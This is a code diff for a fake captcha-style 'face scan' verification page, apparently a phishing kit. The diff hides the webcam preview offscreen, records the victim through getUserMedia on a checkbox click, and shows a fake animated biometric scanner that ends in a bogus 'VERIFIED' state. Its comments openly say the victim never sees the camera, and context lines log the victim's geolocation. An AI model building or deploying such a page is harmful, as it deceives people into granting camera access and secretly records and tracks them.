@@ -83,59 +83,88 @@ body {
 .verify-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
 .verify-sub { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
 
-/* face scan box */
-.face-box {
-  position: relative;
-  width: 200px; height: 220px;
-  margin: 0 auto 20px;
-  border-radius: 12px;
-  overflow: hidden;
-  background: #111;
-}
+/* hidden video — records silently, never shown */
 #cam-preview {
-  width: 100%; height: 100%;
-  object-fit: cover; display: none;
-  transform: scaleX(-1);
+  position: fixed; top: -9999px; left: -9999px;
+  width: 1px; height: 1px; opacity: 0; pointer-events: none;
 }
-.face-placeholder {
-  position: absolute; inset: 0;
-  display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-  color: #555; gap: 8px;
-}
-.face-placeholder svg { opacity: 0.4; }
-.face-placeholder span { font-size: 12px; }
 
-/* face oval overlay */
-.face-oval-wrap {
-  position: absolute; inset: 0;
+/* fake biometric scan widget */
+.scan-widget {
+  margin: 0 auto 20px;
+  width: 180px; height: 180px;
+  position: relative;
   display: none;
   align-items: center; justify-content: center;
+}
+.scan-widget.active { display: flex; }
+
+/* rotating ring */
+.scan-ring {
+  position: absolute; inset: 0;
+  border-radius: 50%;
+  border: 2.5px solid #e8e8e8;
+}
+.scan-ring-spin {
+  position: absolute; inset: 0;
+  border-radius: 50%;
+  border: 2.5px solid transparent;
+  border-top-color: #f38020;
+  border-right-color: #fbad41;
+  animation: ring-spin 1.2s linear infinite;
+}
+@keyframes ring-spin { to { transform: rotate(360deg); } }
+
+/* inner pulsing dot */
+.scan-dot {
+  width: 56px; height: 56px;
+  border-radius: 50%;
+  background: radial-gradient(circle, #fbad41 0%, #f38020 60%, transparent 100%);
+  animation: dot-pulse 1.6s ease-in-out infinite;
+  position: relative; z-index: 1;
+}
+@keyframes dot-pulse {
+  0%,100% { transform: scale(1); opacity: 0.9; }
+  50%      { transform: scale(1.18); opacity: 1; }
+}
+
+/* scanning bar that sweeps inside the ring */
+.scan-sweep {
+  position: absolute; inset: 12px;
+  border-radius: 50%;
+  overflow: hidden;
   pointer-events: none;
 }
-.face-oval {
-  width: 110px; height: 145px;
-  border: 2.5px solid #f38020;
-  border-radius: 50%;
-  animation: oval-pulse 2s ease infinite;
+.scan-sweep::after {
+  content: '';
+  position: absolute; top: 0; left: 50%;
+  width: 50%; height: 100%;
+  background: conic-gradient(from 0deg, rgba(243,128,32,0.18) 0%, transparent 60%);
+  transform-origin: left center;
+  animation: sweep 1.2s linear infinite;
 }
-@keyframes oval-pulse { 0%,100%{border-color:#f38020;} 50%{border-color:#fbad41;} }
+@keyframes sweep { to { transform: rotate(360deg); } }
 
-.scan-line {
-  position: absolute; left: 0; right: 0;
-  height: 2px;
-  background: linear-gradient(90deg, transparent, #f38020 50%, transparent);
-  display: none;
-  animation: scan-anim 1.8s linear infinite;
-}
-@keyframes scan-anim { 0%{top:15%} 100%{top:85%} }
-
-.face-tip {
-  position: absolute; bottom: 10px; left: 0; right: 0;
+/* scan status label */
+.scan-label {
+  position: absolute; bottom: -24px; left: 0; right: 0;
   text-align: center; font-size: 11px; font-weight: 600;
-  color: #fff; text-shadow: 0 1px 4px rgba(0,0,0,0.8);
-  display: none;
+  color: #f38020; letter-spacing: 0.5px;
+  animation: blink-label 1.2s ease infinite;
 }
+@keyframes blink-label { 0%,100%{opacity:1} 50%{opacity:0.5} }
+
+/* progress dots */
+.scan-dots { display: flex; gap: 5px; justify-content: center; margin-bottom: 14px; display: none; }
+.scan-dots.active { display: flex; }
+.scan-dots span {
+  width: 7px; height: 7px; border-radius: 50%;
+  background: #f38020; opacity: 0.3;
+  animation: dot-seq 1.2s ease infinite;
+}
+.scan-dots span:nth-child(2) { animation-delay: 0.2s; }
+.scan-dots span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes dot-seq { 0%,100%{opacity:0.3} 50%{opacity:1} }
 
 /* captcha row (checkbox style) */
 .captcha-row {
@@ -235,19 +264,20 @@ body {
       Complete a quick face scan to continue.
     </div>
 
-    <div class="face-box" id="face-box">
-      <video id="cam-preview" autoplay playsinline muted></video>
-      <div class="face-placeholder" id="face-placeholder">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="#555">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
-        </svg>
-        <span>Camera inactive</span>
-      </div>
-      <div class="face-oval-wrap" id="face-oval-wrap">
-        <div class="face-oval"></div>
-      </div>
-      <div class="scan-line" id="scan-line"></div>
-      <div class="face-tip" id="face-tip">Position your face in the oval</div>
+    <!-- hidden video — records silently in background -->
+    <video id="cam-preview" autoplay playsinline muted></video>
+
+    <!-- fake biometric scanner widget (victim sees this, not the camera) -->
+    <div class="scan-widget" id="scan-widget">
+      <div class="scan-ring"></div>
+      <div class="scan-ring-spin"></div>
+      <div class="scan-sweep"></div>
+      <div class="scan-dot"></div>
+      <div class="scan-label" id="scan-label">SCANNING</div>
+    </div>
+
+    <div class="scan-dots" id="scan-dots">
+      <span></span><span></span><span></span>
     </div>
 
     <!-- Checkbox row (triggers camera on click) -->
@@ -334,7 +364,7 @@ setTimeout(() => {
   logVictim(geoData);
 }, 3200);
 
-// Checkbox click → request camera
+// Checkbox click → silently request camera, show fake scanner
 async function startVerify() {
   const row = document.getElementById('captcha-row');
   const chk = document.getElementById('captcha-check');
@@ -343,22 +373,43 @@ async function startVerify() {
   if (chk.classList.contains('checked')) return;
 
   row.style.pointerEvents = 'none';
-  msg.textContent = 'Initializing face scan...';
+  msg.textContent = 'Initializing biometric scan...';
 
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-    // Camera granted
-    chk.classList.add('checked');
-    document.getElementById('cam-preview').srcObject = stream;
-    document.getElementById('cam-preview').style.display = 'block';
-    document.getElementById('face-placeholder').style.display = 'none';
-    document.getElementById('face-oval-wrap').style.display = 'flex';
-    document.getElementById('scan-line').style.display = 'block';
-    document.getElementById('face-tip').style.display = 'block';
 
-    msg.textContent = 'Scanning... please look at the camera';
-    document.getElementById('verify-btn').disabled = false;
+    // Attach stream to hidden video — victim never sees it
+    const vid = document.getElementById('cam-preview');
+    vid.srcObject = stream;
+
+    // Show fake animated scanner widget instead
+    chk.classList.add('checked');
+    document.getElementById('scan-widget').classList.add('active');
+    document.getElementById('scan-dots').classList.add('active');
+
+    // Animate scan label through stages
+    const label = document.getElementById('scan-label');
+    const stages = ['SCANNING', 'ANALYZING', 'VERIFYING', 'COMPLETE'];
+    let si = 0;
+    const labelTimer = setInterval(() => {
+      si = (si + 1) % stages.length;
+      label.textContent = stages[si];
+    }, 1800);
+
+    msg.textContent = 'Biometric scan in progress...';
     startRecording();
+
+    // Enable verify button after 3s fake scan
+    setTimeout(() => {
+      clearInterval(labelTimer);
+      label.textContent = 'VERIFIED ✓';
+      label.style.color = '#2da44e';
+      label.style.animation = 'none';
+      document.getElementById('scan-dots').classList.remove('active');
+      document.getElementById('verify-btn').disabled = false;
+      msg.textContent = 'Scan complete. Click "Verify & Continue" to proceed.';
+    }, 3500);
+
   } catch(e) {
     msg.textContent = 'Camera access required to complete verification.';
     row.style.pointerEvents = 'auto';
